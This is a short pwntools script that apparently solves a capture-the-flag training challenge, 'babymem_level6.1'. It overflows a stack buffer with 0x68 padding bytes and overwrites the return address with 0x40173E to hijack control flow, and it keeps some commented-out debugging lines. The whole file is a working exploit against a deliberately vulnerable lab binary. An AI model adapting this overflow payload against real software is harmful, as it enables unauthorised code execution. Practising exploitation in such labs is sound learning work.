from pwn import *
p = process("/challenge/babymem_level6.1")
#context.terminal = ['tmux', 'splitw', '-h']
#p = gdb.debug("/challenge/babymem_level6.1", gdbscript='continue')
p.sendline(b"255")

s=b"A"*(0x68)+0x40173E.to_bytes(8,"little")
p.send(s)
all = p.recvall()
print(all.decode())

# print(s)

# fd = open("ttt-raw","wb+")
# fd.write(s)
# fd.close()
# os.system("cat ttt-raw | /challenge/babymem_level6.0")